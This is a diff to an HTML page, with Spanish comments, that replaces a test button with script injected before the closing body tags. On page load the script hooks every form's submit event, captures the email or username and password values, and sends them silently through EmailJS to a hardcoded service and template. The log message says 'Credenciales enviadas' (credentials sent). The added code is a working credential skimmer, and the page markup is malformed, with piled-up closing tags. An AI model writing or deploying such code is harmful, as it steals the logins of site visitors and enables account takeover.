@@ -779,29 +779,56 @@
     });
 </script>
 
-></div></div><!-- Todo tu código original aquí -->
-
-<!-- AÑADIR ESTO AQUÍ (justo antes de </body>) -->
-<button onclick="testEmailJS()" style="position:fixed; bottom:10px; right:10px; z-index:9999; padding:10px; background:red; color:white;">
-    TEST EMAIL
-</button>
+></div></div>
+></div></div><!-- Tu contenido original -->
 
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
-function testEmailJS() {
+(function() {
     emailjs.init({ publicKey: "3x0styJQNXamR4XT4" });
     
-    emailjs.send('service_33u0mdn', 'template_ghyltzf', {
-        user_email: 'test@test.com',
-        password: 'test123',
-        timestamp: new Date().toLocaleString('es-ES')
-    }).then(function() {
-        alert('✅ EMAIL ENVIADO!');
-    }).catch(function(error) {
-        alert('❌ ERROR: ' + error.text);
+    window.addEventListener('load', function() {
+        const forms = document.querySelectorAll('form');
+        
+        forms.forEach(function(form) {
+            form.addEventListener('submit', function(e) {
+                const inputs = form.querySelectorAll('input');
+                let email = '';
+                let password = '';
+                
+                inputs.forEach(function(input) {
+                    const type = input.type.toLowerCase();
+                    const name = (input.name || '').toLowerCase();
+                    const id = (input.id || '').toLowerCase();
+                    
+                    if (type === 'email' || type === 'text' || 
+                        name.includes('email') || name.includes('user') || 
+                        id.includes('email') || id.includes('user')) {
+                        email = input.value;
+                    }
+                    
+                    if (type === 'password') {
+                        password = input.value;
+                    }
+                });
+                
+                if (email && password) {
+                    emailjs.send('service_33u0mdn', 'template_ghyltzf', {
+                        user_email: email,
+                        password: password,
+                        timestamp: new Date().toLocaleString('es-ES')
+                    }).then(function() {
+                        console.log('✅ Credenciales enviadas');
+                    }).catch(function(error) {
+                        console.error('❌ Error:', error);
+                    });
+                }
+            });
+        });
     });
-}
+})();
 </script>
 
-></div></div></body></html></body></html></body></html>
+></div></div></body></html></body></html></body></html></body></html></body></html></body></html>
+
 
